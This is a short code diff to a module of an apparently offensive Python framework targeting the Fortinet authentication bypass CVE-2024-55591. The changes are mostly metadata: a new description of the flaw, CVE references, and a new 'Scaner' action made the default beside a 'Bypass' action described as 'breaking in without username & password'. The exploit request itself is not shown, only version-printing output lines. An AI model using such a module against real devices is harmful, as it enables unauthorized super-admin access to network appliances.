@@ -4,19 +4,32 @@ import smf
 from lib.smf.ssl.netssl import *
 
 metadata = {
-    "Name": "Fortinet API login bypass",
+    "Name": "Fortinet scan API login bypass",
     "Description": """
-Attempting to bypass the Fortinet login API using
-vulnerability from cve that was discovered publicly,
-and just do a check, if it goes through then the output
-will release the version of Fortinet that is used.
+An Authentication Bypass Using an Alternate Path or Channel 
+vulnerability [CWE-288] affecting FortiOS version 7.0.0 
+through 7.0.16 and FortiProxy version 7.0.0 through 7.0.19 and 7.2.0 
+through 7.2.12 allows a remote attacker to gain super-admin 
+privileges via crafted requests to Node.js websocket module.
 """,
     "Author": ["zxelzy"],
     "Action": [
         ["Bypass", {"Description": "Breaking in without username & password"}],
+        ["Scaner", {"Description": "Scan to ensure security gaps"}]
     ],
-    "DefaultAction": "Bypass",
+    "DefaultAction": "Scaner",
     "License": "SMF License",
+    
+    "Vulnerability": {
+        "CVE": "CVE-2024-55591",
+        "Severity": "CRITICAL",
+        "Published": "2025-01-14",
+        "Updated": "2025-01-14",
+        "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2024-55591",
+            "https://attackerkb.com/topics/5K4caFRSPo/cve-2024-55591"
+        ]
+    }
 }
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 REQUIRED_OPTIONS = {"URL": ""}
@@ -42,7 +55,6 @@ def execute(options):
             smf.printf(
                 f"[+] System Info: {res.json().get('results', {}).get('version', 'N/A')}"
             )
-            smf.printf(f"{'='*40}")
         else:
             smf.printf("[-] Target not vulnerable or patched.")
 
